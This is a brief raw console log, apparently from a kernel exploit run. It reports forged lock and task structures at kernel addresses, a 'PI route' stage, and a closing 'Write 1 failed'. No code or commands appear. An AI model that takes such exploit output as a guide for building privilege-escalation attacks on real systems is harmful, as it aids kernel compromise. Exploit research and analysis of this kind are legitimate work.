+[33m[*] [0mtcp route enter page=ffffff8a6b938000 fake_lock=ffffff8a6b938e80 fake_w0=ffffff8a6b939180 fake_task=ffffff8a6b93d800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+73430ms]   PI route done
+[31m[-] [0mWrite 1 failed
